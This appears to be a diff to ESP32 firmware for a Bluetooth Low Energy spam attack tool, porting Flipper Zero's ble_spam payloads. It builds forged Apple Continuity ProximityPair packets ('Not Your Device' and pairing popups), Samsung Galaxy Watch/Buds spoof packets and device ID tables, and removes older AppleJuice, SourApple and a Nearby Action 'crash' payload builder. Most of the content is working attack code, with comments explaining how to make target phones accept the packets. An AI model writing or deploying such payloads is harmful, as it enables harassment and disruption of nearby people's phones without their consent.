@@ -114,36 +114,14 @@ static bool isSamsungDevice(const String &mac) {
     return false;
 }
 
-// ============================================================================
-// Structs used by legacy paths
-// ============================================================================
-struct BLEData {
-    BLEAdvertisementData AdvData;
-    BLEAdvertisementData ScanData;
-};
 struct WatchModel {
     uint8_t value;
-};
-struct mac_addr {
-    unsigned char bytes[6];
-};
-struct Station {
-    uint8_t mac[6];
-    bool selected;
 };
 struct DeviceType {
     uint32_t value;
 };
 
-enum EBLEPayloadType { Microsoft, SourApple, AppleJuice, Samsung, Google };
-
-// ============================================================================
-// Apple Continuity — legacy static packets (used by AppleJuice legacy path)
-// ============================================================================
-const uint8_t IOS1[] = {
-    0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14, 0x03, 0x0b, 0x0c, 0x11, 0x10, 0x05, 0x06, 0x09, 0x17, 0x12, 0x16
-};
-const uint8_t IOS2[] = {0x01, 0x06, 0x20, 0x2b, 0xc0, 0x0d, 0x13, 0x27, 0x0b, 0x09, 0x02, 0x1e, 0x24};
+enum EBLEPayloadType { Microsoft, Samsung, Google };
 
 // Apple Continuity — Nearby Action type codes
 static const uint8_t continuity_na_actions[] = {
@@ -190,19 +168,24 @@ int android_models_count = sizeof(android_models) / sizeof(android_models[0]);
 // Samsung EasySetup — Galaxy Watch + Galaxy Buds models
 // ============================================================================
 
-// Galaxy Watch — single byte model selector
+// Galaxy Watch — single byte model selector, ported from the current Flipper
+// Zero ble_spam app's samsung_watches table.
 // Triggers "Galaxy Watch detected" pairing popup on Samsung Android devices
-const WatchModel watch_models[] = {{0x1A}, {0x01}, {0x02}, {0x03}, {0x04}, {0x05}, {0x06}, {0x07},
-                                   {0x08}, {0x09}, {0x0A}, {0x0B}, {0x0C}, {0x11}, {0x12}, {0x13},
-                                   {0x14}, {0x15}, {0x16}, {0x17}, {0x18}, {0x1B}, {0x1C}, {0x1D},
-                                   {0x1E}, {0x20}, {0xE4}, {0xE5}, {0xEC}, {0xEF}};
+const WatchModel watch_models[] = {
+    {0x1A}, {0x01}, {0x02}, {0x03}, {0x04}, {0x05}, {0x06}, {0x07}, {0x08}, {0x09}, {0x0A}, {0x0B},
+    {0x0C}, {0x11}, {0x12}, {0x13}, {0x14}, {0x15}, {0x16}, {0x17}, {0x18}, {0x1B}, {0x1C}, {0x1D},
+    {0x1E}, {0x20}, {0x21}, {0x22}, {0x23}, {0x24}, {0x25}, {0x26}, {0x27}, {0x28}, {0x29}, {0x2A},
+    {0x30}, {0x31}, {0x32}, {0x33}, {0x34}, {0x35}, {0x40}, {0x41}, {0x42}, {0x60}, {0x61}, {0x62},
+};
 static const int watch_models_count = sizeof(watch_models) / sizeof(watch_models[0]);
 
-// Galaxy Buds — 3-byte model codes (MarlinSchuck)
+// Galaxy Buds — 3-byte RGB color codes, ported from the current Flipper Zero
+// ble_spam app's samsung_buds table.
 // Triggers "Galaxy Buds detected" pairing popup on Samsung Android devices
 static const uint32_t samsung_buds_models[] = {
     0xEE7A0C, 0x9D1700, 0x39EA48, 0xA7C62C, 0x850116, 0x3D8F41, 0x3B6D02, 0xAE063C, 0xB8B905, 0xEAAA17,
     0xD30704, 0x9DB006, 0x101F1A, 0x859608, 0x8E4503, 0x2C6740, 0x3F6718, 0x42C519, 0xAE073A, 0x011716,
+    0x123456, 0x654321, 0x789ABC, 0xDEF123, 0x456789, 0xABC123, 0x321654, 0x987654, 0x654987, 0x321987,
 };
 static const int samsung_buds_count = sizeof(samsung_buds_models) / sizeof(samsung_buds_models[0]);
 
@@ -265,59 +248,6 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, String 
 #endif
             break;
         }
-        case AppleJuice: {
-            int rand_val = random(2);
-            if (rand_val == 0) {
-                uint8_t packet[26] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[random() % sizeof(IOS1)],
-                                      0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
-                                      0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
-                                      0x00, 0x00};
-#ifdef NIMBLE_V2_PLUS
-                AdvData.addData(packet, 26);
-#else
-                advDataVector.assign(packet, packet + 26);
-                AdvData.addData(advDataVector);
-#endif
-            } else if (rand_val == 1) {
-                uint8_t packet[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a,
-                                      0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, IOS2[random() % sizeof(IOS2)],
-                                      0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00,
-                                      0x00, 0x00};
-#ifdef NIMBLE_V2_PLUS
-                AdvData.addData(packet, 23);
-#else
-                advDataVector.assign(packet, packet + 23);
-                AdvData.addData(advDataVector);
-#endif
-            }
-            break;
-        }
-        case SourApple: {
-            uint8_t packet[17];
-            uint8_t j = 0;
-            packet[j++] = 16;
-            packet[j++] = 0xFF;
-            packet[j++] = 0x4C;
-            packet[j++] = 0x00;
-            packet[j++] = 0x0F;
-            packet[j++] = 0x05;
-            packet[j++] = 0xC1;
-            const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
-            packet[j++] = types[random() % sizeof(types)];
-            esp_fill_random(&packet[j], 3);
-            j += 3;
-            packet[j++] = 0x00;
-            packet[j++] = 0x00;
-            packet[j++] = 0x10;
-            esp_fill_random(&packet[j], 3);
-#ifdef NIMBLE_V2_PLUS
-            AdvData.addData(packet, 17);
-#else
-            advDataVector.assign(packet, packet + 17);
-            AdvData.addData(advDataVector);
-#endif
-            break;
-        }
         case Samsung: {
             BLEAdvertisementData AdvData = BLEAdvertisementData();
 #ifndef NIMBLE_V2_PLUS
@@ -327,7 +257,7 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, String 
                 // Galaxy Watch packet
                 uint8_t model = watch_models[random(watch_models_count)].value;
                 uint8_t Samsung_Data[15] = {
-                    0x0F,
+                    0x0E,
                     0xFF,
                     0x75,
                     0x00,
@@ -352,7 +282,7 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, String 
             } else {
                 // Galaxy Buds packet (MarlinSchuck)
                 uint32_t model = samsung_buds_models[random(samsung_buds_count)];
-                uint8_t Buds_Data[28];
+                uint8_t Buds_Data[31];
                 uint8_t bi = 0;
                 Buds_Data[bi++] = 27;
                 Buds_Data[bi++] = 0xFF;
@@ -382,6 +312,13 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, String 
                 Buds_Data[bi++] = 0x00;
                 Buds_Data[bi++] = 0xC7;
                 Buds_Data[bi++] = 0x00;
+                // Trailing truncated record (length=0x10 claimed, only 2 data
+                // bytes present) — ported from the Flipper Zero ble_spam app.
+                // Real Galaxy Buds advertise this stub second record; without
+                // it Samsung's scanner doesn't recognize the packet.
+                Buds_Data[bi++] = 0x10;
+                Buds_Data[bi++] = 0xFF;
+                Buds_Data[bi++] = 0x75;
 #ifdef NIMBLE_V2_PLUS
                 AdvData.addData(Buds_Data, bi);
 #else
@@ -473,7 +410,7 @@ void ibeacon(const char *DeviceName, const char *BEACON_UUID, int ManufacturerId
 enum BleSpamAttackType {
     BLE_SPAM_ATTACK_APPLE_PAIRING,
     BLE_SPAM_ATTACK_APPLE_ACTION,
-    BLE_SPAM_ATTACK_APPLE_ENHANCED,
+    BLE_SPAM_ATTACK_APPLE_NOT_YOUR_DEVICE,
     BLE_SPAM_ATTACK_ANDROID_ALERT,
     BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR,
     BLE_SPAM_ATTACK_SAMSUNG,
@@ -599,7 +536,7 @@ static const BleSpamAttackOption BLE_SPAM_ATTACK_OPTIONS[] = {
 #if !defined(LITE_VERSION)
     {BLE_SPAM_ATTACK_APPLE_PAIRING,      "Apple Pairing Prompt" },
     {BLE_SPAM_ATTACK_APPLE_ACTION,       "Apple Action Modal"   },
-    {BLE_SPAM_ATTACK_APPLE_ENHANCED,     "Apple Spam (Enhanced)"},
+    {BLE_SPAM_ATTACK_APPLE_NOT_YOUR_DEVICE, "Apple Not Your Device"},
 #endif
     {BLE_SPAM_ATTACK_ANDROID_ALERT,      "Android Device Alert" },
     {BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR, "Windows Swift Pair"   },
@@ -614,24 +551,44 @@ struct BleSpamAppleDevice {
     const char *payload_name;
 };
 
-static const BleSpamAppleDevice BLE_SPAM_APPLE_PAIRING_DEVICES[] = {
-    {"AirPods Gen 1",     "AirPods"          },
-    {"AirPods Gen 2",     "AirPods Gen 2"    },
-    {"AirPods Gen 3",     "AirPods Gen 3"    },
-    {"AirPods Pro",       "AirPods Pro"      },
-    {"AirPods Pro 2",     "AirPods Pro Gen 2"},
-    {"AirPods Max",       "AirPods Max"      },
-    {"AirTag",            "AirPods"          },
-    {"Apple TV",          "AppleTV Setup"    },
-    {"Apple Watch",       "AirPods"          },
-    {"Beats Flex",        "Beats Studio Buds"},
-    {"Beats Solo Pro",    "Beats Solo Pro"   },
-    {"Beats Studio Buds", "Beats Studio Buds"},
-    {"Beats Powerbeats",  "Beats Fit Pro"    },
-    {"HomePod",           "HomePod Setup"    },
-    {"HomePod Mini",      "HomePod Setup"    },
-    {"iPhone Nudge",      "Setup New Phone"  }
+// ProximityPair (Apple Pairing / Not Your Device) device list, ported from the
+// current Flipper Zero ble_spam app's apple_devices table.
+struct AppleProximityDevice {
+    const char *name;
+    uint16_t device_id;
 };
+
+static const AppleProximityDevice APPLE_PROXIMITY_DEVICES[] = {
+    {"AirPods Pro",               0x0E20},
+    {"AirPods Pro 2nd Gen",       0x1420},
+    {"AirPods Pro 2nd Gen USB-C", 0x2420},
+    {"AirPods 4 ANC",             0x2820},
+    {"AirPods 4",                 0x2920},
+    {"AirPods Max USB-C",         0x2B20},
+    {"Beats Powerbeats Pro 2",    0x2C20},
+    {"Beats Solo 3",              0x0620},
+    {"AirPods Max",               0x0A20},
+    {"Beats Flex",                0x1020},
+    {"AirTag",                    0x0055},
+    {"Hermes AirTag",             0x0030},
+    {"AirPods",                   0x0220},
+    {"AirPods 2nd Gen",           0x0F20},
+    {"AirPods 3rd Gen",           0x1320},
+    {"Powerbeats 3",              0x0320},
+    {"Powerbeats Pro",            0x0B20},
+    {"Beats Solo Pro",            0x0C20},
+    {"Beats Studio Buds",         0x1120},
+    {"Beats X",                   0x0520},
+    {"Beats Studio 3",            0x0920},
+    {"Beats Studio Pro",          0x1720},
+    {"Beats Fit Pro",             0x1220},
+    {"Beats Studio Buds+",        0x1620},
+    {"Beats Solo 4",              0x2520},
+    {"Beats Solo Buds",           0x2620},
+    {"Powerbeats Fit",            0x2F20},
+};
+static const int APPLE_PROXIMITY_DEVICE_COUNT =
+    sizeof(APPLE_PROXIMITY_DEVICES) / sizeof(APPLE_PROXIMITY_DEVICES[0]);
 
 static const BleSpamAppleDevice BLE_SPAM_APPLE_ACTION_DEVICES[] = {
     {"Apple TV Setup",      "AppleTV Setup"     },
@@ -770,7 +727,11 @@ static void bleSpamSaveConfig(const BleSpamConfig &config) {
 }
 
 static uint32_t bleSpamMsStep(uint32_t ms) {
-    if (ms < 20) return 1;
+    // <= (not <) so stepping away from 20 in either direction uses step 1 —
+    // otherwise decrementing from exactly 20 used the 10-199 bracket's step
+    // (10) and jumped straight to 10, skipping 11-19, while incrementing from
+    // 19 stayed on step 1. Keeps the whole 10-20 range at increments of 1.
+    if (ms <= 20) return 1;
     if (ms < 200) return 10;
     if (ms < 1000) return 50;
     return 500;
@@ -911,19 +872,15 @@ static BleSpamAttackType bleSpamGetAttackTypeByIndex(int index) {
 
 static const char *bleSpamGetAttackLabel(int index) { return BLE_SPAM_ATTACK_OPTIONS[index].label; }
 
-#if !defined(LITE_VERSION)
-static const char *getApplePayloadName(int index);
-static int getApplePayloadCount();
-#endif
-
 static int bleSpamGetDeviceCount(BleSpamAttackType type) {
     switch (type) {
 #if !defined(LITE_VERSION)
         case BLE_SPAM_ATTACK_APPLE_PAIRING:
-            return sizeof(BLE_SPAM_APPLE_PAIRING_DEVICES) / sizeof(BleSpamAppleDevice) + 1; // +1 Random/All
+            return APPLE_PROXIMITY_DEVICE_COUNT + 1; // +1 Random/All
         case BLE_SPAM_ATTACK_APPLE_ACTION:
             return sizeof(BLE_SPAM_APPLE_ACTION_DEVICES) / sizeof(BleSpamAppleDevice) + 1; // +1 Random/All
-        case BLE_SPAM_ATTACK_APPLE_ENHANCED: return 6; // 5 iCloud devices + Random/All
+        case BLE_SPAM_ATTACK_APPLE_NOT_YOUR_DEVICE:
+            return APPLE_PROXIMITY_DEVICE_COUNT + 1; // +1 Random/All
 #endif
         case BLE_SPAM_ATTACK_ANDROID_ALERT:
             return sizeof(BLE_SPAM_ANDROID_DEVICES) / sizeof(BLE_SPAM_ANDROID_DEVICES[0]);
@@ -951,9 +908,8 @@ static const char *bleSpamGetDeviceName(BleSpamAttackType type, int index) {
     switch (type) {
 #if !defined(LITE_VERSION)
         case BLE_SPAM_ATTACK_APPLE_PAIRING: {
-            int staticCount = (int)(sizeof(BLE_SPAM_APPLE_PAIRING_DEVICES) / sizeof(BleSpamAppleDevice));
-            if (index >= 0 && index < staticCount) return BLE_SPAM_APPLE_PAIRING_DEVICES[index].ui_name;
-            if (index == staticCount) return "Random / All";
+            if (index >= 0 && index < APPLE_PROXIMITY_DEVICE_COUNT) return APPLE_PROXIMITY_DEVICES[index].name;
+            if (index == APPLE_PROXIMITY_DEVICE_COUNT) return "Random / All";
             return "Apple";
         }
         case BLE_SPAM_ATTACK_APPLE_ACTION: {
@@ -962,17 +918,9 @@ static const char *bleSpamGetDeviceName(BleSpamAttackType type, int index) {
             if (index == staticCount) return "Random / All";
             return "Apple";
         }
-        case BLE_SPAM_ATTACK_APPLE_ENHANCED: {
-            if (index >= 0 && index < 5) {
-                snprintf(
-                    bleSpamDeviceNameBuf,
-                    sizeof(bleSpamDeviceNameBuf),
-                    "%s (iCloud)",
-                    getApplePayloadName(index)
-                );
-                return bleSpamDeviceNameBuf;
-            }
-            if (index == 5) return "Random / All";
+        case BLE_SPAM_ATTACK_APPLE_NOT_YOUR_DEVICE: {
+            if (index >= 0 && index < APPLE_PROXIMITY_DEVICE_COUNT) return APPLE_PROXIMITY_DEVICES[index].name;
+            if (index == APPLE_PROXIMITY_DEVICE_COUNT) return "Random / All";
             return "Apple";
         }
 #endif
@@ -1027,183 +975,59 @@ static const char *bleSpamGetDeviceName(BleSpamAttackType type, int index) {
 }
 
 #if !defined(LITE_VERSION)
-// ── Apple Continuity payloads (static) ──────────────────────────
-static const uint8_t data_airpods[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa,
-                                       0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
-                                       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-static const uint8_t data_airpods_pro[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa,
-                                           0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
-                                           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-static const uint8_t data_airpods_max[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa,
-                                           0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
-                                           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-static const uint8_t data_airpods_gen2[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa,
-                                            0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
-                                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-static const uint8_t data_airpods_gen3[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa,
-                                            0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
-                                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-static const uint8_t data_airpods_pro_gen2[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa,
-                                                0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
-                                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-static const uint8_t data_beats_solo_pro[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa,
-                                              0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
-                                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-static const uint8_t data_beats_studio_buds[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa,
-                                                 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
-                                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-static const uint8_t data_beats_fit_pro[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa,
-                                             0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
-                                             0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-static const uint8_t data_beats_studio_buds_plus[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa,
-                                                      0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
-                                                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-static const uint8_t data_apple_tv_setup[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
-                                              0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c,
-                                              0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
-static const uint8_t data_setup_new_phone[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
-                                               0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c,
-                                               0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
-static const uint8_t data_transfer_number[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
-                                               0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c,
-                                               0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
-static const uint8_t data_tv_color_balance[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
-                                                0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c,
-                                                0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
-static const uint8_t data_vision_pro[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1,
-                                          0x24, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
-static const uint8_t data_apple_tv_connecting[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
-                                                   0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c,
-                                                   0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
-static const uint8_t data_apple_tv_audio_sync[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
-                                                   0x00, 0x0f, 0x05, 0xc1, 0x19, 0x60, 0x4c,
-                                                   0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
-static const uint8_t data_setup_new_apple_tv[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
-                                                  0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c,
-                                                  0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
-static const uint8_t data_homepod_setup[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1,
-                                             0x0B, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
-static const uint8_t data_homekit_apple_tv_setup[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
-                                                      0x00, 0x0f, 0x05, 0xc1, 0x0D, 0x60, 0x4c,
-                                                      0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
-static const uint8_t data_pair_apple_tv[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1,
-                                             0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
-static const uint8_t data_setup_new_ipad[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
-                                              0x00, 0x0f, 0x05, 0x40, 0x09, 0x60, 0x4c,
-                                              0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
-
-struct ApplePayload {
-    const char *name;
-    const uint8_t *data;
-    uint8_t length;
-};
-
-static const ApplePayload apple_payloads[] = {
-    {"AirPods",            data_airpods,                sizeof(data_airpods)               },
-    {"AirPods Pro",        data_airpods_pro,            sizeof(data_airpods_pro)           },
-    {"AirPods Max",        data_airpods_max,            sizeof(data_airpods_max)           },
-    {"AirPods Gen 2",      data_airpods_gen2,           sizeof(data_airpods_gen2)          },
-    {"AirPods Gen 3",      data_airpods_gen3,           sizeof(data_airpods_gen3)          },
-    {"AirPods Pro Gen 2",  data_airpods_pro_gen2,       sizeof(data_airpods_pro_gen2)      },
-    {"Beats Solo Pro",     data_beats_solo_pro,         sizeof(data_beats_solo_pro)        },
-    {"Beats Studio Buds",  data_beats_studio_buds,      sizeof(data_beats_studio_buds)     },
-    {"Beats Fit Pro",      data_beats_fit_pro,          sizeof(data_beats_fit_pro)         },
-    {"Beats Studio Buds+", data_beats_studio_buds_plus, sizeof(data_beats_studio_buds_plus)},
-    {"AppleTV Setup",      data_apple_tv_setup,         sizeof(data_apple_tv_setup)        },
-    {"Setup New Phone",    data_setup_new_phone,        sizeof(data_setup_new_phone)       },
-    {"Transfer Number",    data_transfer_number,        sizeof(data_transfer_number)       },
-    {"TV Color Balance",   data_tv_color_balance,       sizeof(data_tv_color_balance)      },
-    {"Apple Vision Pro",   data_vision_pro,             sizeof(data_vision_pro)            },
-    {"AppleTV Connecting", data_apple_tv_connecting,    sizeof(data_apple_tv_connecting)   },
-    {"AppleTV Audio Sync", data_apple_tv_audio_sync,    sizeof(data_apple_tv_audio_sync)   },
-    {"Setup New AppleTV",  data_setup_new_apple_tv,     sizeof(data_setup_new_apple_tv)    },
-    {"HomePod Setup",      data_homepod_setup,          sizeof(data_homepod_setup)         },
-    {"HomeKit AppleTV",    data_homekit_apple_tv_setup, sizeof(data_homekit_apple_tv_setup)},
-    {"Pair AppleTV",       data_pair_apple_tv,          sizeof(data_pair_apple_tv)         },
-    {"Setup New iPad",     data_setup_new_ipad,         sizeof(data_setup_new_ipad)        }
-};
-static const int apple_payload_count = sizeof(apple_payloads) / sizeof(ApplePayload);
-
-static int getApplePayloadCount() { return apple_payload_count; }
-
-static const char *getApplePayloadName(int index) {
-    if (index < 0 || index >= apple_payload_count) return "Unknown";
-    return apple_payloads[index].name;
-}
-
-static bool buildAppleSpamAdvertisement(int payloadIndex, BLEAdvertisementData &advertisementData) {
-    if (payloadIndex < 0 || payloadIndex >= apple_payload_count) return false;
+// Builds a real ProximityPair advertisement (31 bytes), ported from the current
+// Flipper Zero ble_spam app. Status byte, battery, and the 16-byte "encrypted
+// payload" tail are regenerated fresh on every packet. prefix=0x07 triggers the
+// normal device-popup; prefix=0x01 triggers the "Not Your Device" variant.
+static bool buildAppleProximityPair(
+    uint8_t prefix, uint16_t deviceId, BLEAdvertisementData &advertisementData
+) {
+    uint8_t buf[31];
+    uint8_t i = 0;
+    buf[i++] = 0x1E; // AD length
+    buf[i++] = 0xFF; // AD type: manufacturer specific
+    buf[i++] = 0x4C; // Apple company ID
+    buf[i++] = 0x00;
+    buf[i++] = 0x07; // Continuity type: ProximityPair
+    buf[i++] = 0x19; // Continuity size: 25
+    buf[i++] = prefix;
+    buf[i++] = (uint8_t)(deviceId >> 8);
+    buf[i++] = (uint8_t)(deviceId & 0xFF);
+    buf[i++] = 0x55; // Status
+    esp_fill_random(&buf[i], 3); // Battery
+    i += 3;
+    buf[i++] = 0x00; // Color
+    buf[i++] = 0x00; // Reserved
+    esp_fill_random(&buf[i], 16); // "Encrypted payload"
+    i += 16;
 
     advertisementData = BLEAdvertisementData();
-    advertisementData.setFlags(0x06);
-
-    uint8_t fullPayload[31];
-    fullPayload[0] = apple_payloads[payloadIndex].length + 1;
-    fullPayload[1] = 0xFF;
-    memcpy(&fullPayload[2], apple_payloads[payloadIndex].data, apple_payloads[payloadIndex].length);
-
+    // No setFlags() here: this manufacturer-data AD entry is already exactly
+    // 31 bytes (the legacy advertising PDU max). Adding a 3-byte Flags AD
+    // entry first pushes NimBLE's payload past BLE_HS_ADV_MAX_SZ, so the
+    // addData() call below silently fails and returns false — the device
+    // then broadcasts flags only, with no Apple payload at all (no popup,
+    // but MAC still rotates and "packets" still go out, which is exactly
+    // what looked broken). iOS's Continuity parser doesn't require a Flags
+    // AD entry to read manufacturer data, and the real Flipper Zero
+    // ble_spam app never sends one for this packet either.
 #ifdef NIMBLE_V2_PLUS
-    advertisementData.addData(fullPayload, apple_payloads[payloadIndex].length + 2);
+    advertisementData.addData(buf, i);
 #else
-    std::vector<uint8_t> payloadVector(fullPayload, fullPayload + apple_payloads[payloadIndex].length + 2);
-    advertisementData.addData(payloadVector);
+    std::vector<uint8_t> dataVec(buf, buf + i);
+    advertisementData.addData(dataVec);
 #endif
     return true;
 }
 
-// ── iCloud binding spoofing (Ninja-jr) ──────────────────────────
-struct iCloudBinding {
-    uint8_t flags;
-    uint8_t sig1;
-    uint8_t sig2;
-    uint8_t status;
-    uint8_t state;
-    uint8_t reserved1;
-    uint8_t reserved2;
-    uint8_t modelMagic;
-};
-
-static const iCloudBinding ICBOUND_PATTERNS[] = {
-    {0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45},
-    {0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x46},
-    {0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x47},
-    {0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x48},
-    {0x20, 0x76, 0xAB, 0x31, 0x01, 0x00, 0x00, 0x46},
-    {0x21, 0x74, 0xAC, 0x2F, 0x01, 0x00, 0x00, 0x45}
-};
-
-static int bleSpamFindApplePayloadIndex(const char *payloadName) {
-    int count = getApplePayloadCount();
-    for (int i = 0; i < count; i++) {
-        if (strcmp(getApplePayloadName(i), payloadName) == 0) return i;
+// Resolves a Pairing/Not-Your-Device menu deviceIndex to a device ID, handling
+// the "Random/All" sentinel at the end of the list.
+static uint16_t bleSpamResolveProximityDeviceId(int deviceIndex) {
+    if (deviceIndex == APPLE_PROXIMITY_DEVICE_COUNT || deviceIndex < 0 ||
+        deviceIndex >= APPLE_PROXIMITY_DEVICE_COUNT) {
+        return APPLE_PROXIMITY_DEVICES[random(APPLE_PROXIMITY_DEVICE_COUNT)].device_id;
     }
-    return 0;
-}
-
-static int bleSpamGetApplePayloadIndex(BleSpamAttackType type, int deviceIndex) {
-    switch (type) {
-        case BLE_SPAM_ATTACK_APPLE_PAIRING: {
-            int staticCount = (int)(sizeof(BLE_SPAM_APPLE_PAIRING_DEVICES) / sizeof(BleSpamAppleDevice));
-            if (deviceIndex == staticCount) {
-                // Random/All — pick random pairing payload
-                return random(getApplePayloadCount() / 2); // pairing payloads are first half
-            }
-            if (deviceIndex < 0 || deviceIndex >= staticCount) return 0;
-            return bleSpamFindApplePayloadIndex(BLE_SPAM_APPLE_PAIRING_DEVICES[deviceIndex].payload_name);
-        }
-        case BLE_SPAM_ATTACK_APPLE_ACTION: {
-            int staticCount = (int)(sizeof(BLE_SPAM_APPLE_ACTION_DEVICES) / sizeof(BleSpamAppleDevice));
-            if (deviceIndex == staticCount) {
-                // Random/All — cycle through all action payloads randomly
-                return bleSpamFindApplePayloadIndex(
-                    BLE_SPAM_APPLE_ACTION_DEVICES[random(staticCount)].payload_name
-                );
-            }
-            if (deviceIndex < 0 || deviceIndex >= staticCount) return 0;
-            return bleSpamFindApplePayloadIndex(BLE_SPAM_APPLE_ACTION_DEVICES[deviceIndex].payload_name);
-        }
-        default: return 0;
-    }
+    return APPLE_PROXIMITY_DEVICES[deviceIndex].device_id;
 }
 #endif
 
@@ -1349,43 +1173,17 @@ static size_t bleSpamBuildContinuityNearbyAction(uint8_t *buf) {
     return i;
 }
 
-static size_t bleSpamBuildContinuityCustomCrash(uint8_t *buf) {
-    uint8_t action = continuity_na_actions[esp_random() % continuity_na_actions_count];
-    uint8_t flags = 0xC0;
-    if (action == 0x20 && (esp_random() % 2)) flags--;
-    if (action == 0x09 && (esp_random() % 2)) flags = 0x40;
-    uint8_t i = 0;
-    buf[i++] = 16;
-    buf[i++] = 0xFF;
-    buf[i++] = 0x4C;
-    buf[i++] = 0x00;
-    buf[i++] = 0x0F;
-    buf[i++] = 5;
-    buf[i++] = flags;
-    buf[i++] = action;
-    esp_fill_random(&buf[i], 3);
-    i += 3;
-    buf[i++] = 0x00;
-    buf[i++] = 0x00;
-    buf[i++] = 0x10;
-    esp_fill_random(&buf[i], 3);
-    i += 3;
